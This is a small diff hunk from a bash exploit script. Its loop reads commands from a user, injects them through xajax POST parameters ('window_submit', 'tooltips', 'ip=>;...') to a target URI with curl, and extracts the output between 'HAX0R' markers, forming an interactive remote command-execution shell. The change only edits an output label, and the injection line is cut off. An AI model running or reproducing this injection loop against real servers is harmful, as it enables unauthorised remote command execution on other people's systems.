@@ -21,7 +21,7 @@ while true;do
     read CMD;
     CRL=$(curl -s "$URI" -d "xajax=window_submit&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;ec>
     PAGE=$(echo "$CRL" | sed -n -e '/HAX0R/,/HAX0R/p'|sed '1d;$d')
-    echo -n -e  "\nResults\n$PAGE"
+    echo -n -e  "\nResults...\n$PAGE"
 done
 
 
